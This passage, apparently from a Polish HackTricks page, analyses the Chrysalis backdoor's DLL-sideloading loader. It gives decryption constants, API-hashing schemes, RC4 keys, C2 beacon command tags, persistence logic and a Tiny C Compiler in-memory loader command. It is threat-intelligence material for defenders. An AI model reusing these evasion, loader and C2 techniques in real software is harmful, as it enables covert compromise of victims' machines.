- `update.exe` (NSIS) tworzy `%AppData%\Bluetooth`, ustawia ją jako **HIDDEN**, upuszcza przemianowany Bitdefender Submission Wizard `BluetoothService.exe`, złośliwy `log.dll` oraz zaszyfrowany blob `BluetoothService`, a następnie uruchamia EXE.
- Host EXE importuje `log.dll` i wywołuje `LogInit`/`LogWrite`. `LogInit` ładuje blob przez mmap; `LogWrite` odszyfrowuje go customowym strumieniem opartym na LCG (stałe **0x19660D** / **0x3C6EF35F**, materiał klucza pochodzący z poprzedniego hasha), nadpisuje bufor plaintextowym shellcodem, zwalnia tymczasowe zasoby i skacze do niego.
- Aby uniknąć IAT, loader rozwiązuje API poprzez hashowanie nazw eksportów używając **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, następnie stosując mieszanie w stylu Murmur (**0x85EBCA6B**) i porównując z solonymi docelowymi hashami.

Główny shellcode (Chrysalis)
- Odszyfrowuje główny moduł przypominający PE przez powtarzanie add/XOR/sub z kluczem `gQ2JR&9;` przez pięć przebiegów, następnie dynamicznie ładuje `Kernel32.dll` → `GetProcAddress`, aby zakończyć rozwiązywanie importów.
- Rekonstruuje ciągi nazw DLL w czasie wykonywania przez per-znakowe transformacje bit-rotate/XOR, potem ładuje `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Używa drugiego resolvera, który przechodzi przez **PEB → InMemoryOrderModuleList**, parsuje każdą tabelę eksportów w blokach 4-bajtowych z mieszaniem w stylu Murmur, i tylko w przypadku braku hasha cofa się do `GetProcAddress`.

Wbudowana konfiguracja & C2
- Konfiguracja znajduje się wewnątrz upuszczonego pliku `BluetoothService` na **offset 0x30808** (rozmiar **0x980**) i jest odszyfrowana RC4 z kluczem `qwhvb^435h&*7`, ujawniając URL C2 i User-Agent.
- Beacony tworzą profil hosta rozdzielany kropkami, poprzedzają tagiem `4Q`, następnie szyfrują RC4 kluczem `vAuig34%^325hGV` przed wywołaniem `HttpSendRequestA` przez HTTPS. Odpowiedzi są odszyfrowywane RC4 i rozdzielane przez switch tagów (`4T` shell, `4V` exec procesu, `4W/4X` zapis pliku, `4Y` odczyt/eksfiltracja, `4\\` uninstall, `4` enumeracja dysków/plików + przypadki transferu w kawałkach).
- Tryb wykonania jest sterowany argumentami CLI: brak argumentów = instalacja persistence (service/Run key) wskazująca na `-i`; `-i` ponownie uruchamia się z `-k`; `-k` pomija instalację i uruchamia payload.

Zaobserwowany alternatywny loader
- To samo włamanie upuściło Tiny C Compiler i wykonało `svchost.exe -nostdlib -run conf.c` z `C:\ProgramData\USOShared\`, z `libtcc.dll` obok. Dostarczone przez atakującego źródło C osadzało shellcode, kompilowało go i uruchamiało w pamięci bez zapisu PE na dysku. Zreplikuj z:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Ta faza TCC-based compile-and-run zaimportowała `Wininet.dll` podczas wykonywania i pobrała second-stage shellcode z hardcoded URL, zapewniając elastyczny loader, który podszywa się pod uruchomienie kompilatora.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
